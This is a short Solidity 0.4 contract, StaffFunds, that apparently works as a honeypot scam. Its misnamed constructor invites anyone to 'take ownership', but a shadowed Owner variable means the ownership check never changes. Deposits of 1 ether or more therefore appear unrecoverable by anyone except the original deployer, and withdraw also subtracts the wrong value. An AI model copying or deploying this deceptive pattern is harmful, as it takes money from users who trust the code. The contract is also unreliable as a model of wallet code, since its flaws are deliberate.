 

pragma solidity ^0.4.17;

contract Owned {
    address public Owner;
    function Owned() { Owner = msg.sender; }
    modifier onlyOwner { if ( msg.sender == Owner ) _; }
}

contract StaffFunds is Owned {
    address public Owner;
    mapping (address=>uint) public deposits;
    
    function StaffWallet() { Owner = msg.sender; }
    
    function() payable { }
    
    function deposit() payable {  
        if( msg.value >= 1 ether )  
            deposits[msg.sender] += msg.value;
        else return;
    }
    
    function withdraw(uint amount) onlyOwner {   
        uint depo = deposits[msg.sender];
        deposits[msg.sender] -= msg.value;  
        if( amount <= depo && depo > 0 )
            msg.sender.send(amount);
    }
 
    function kill() onlyOwner { 
        require(this.balance == 0);  
        suicide(msg.sender);
	}
}  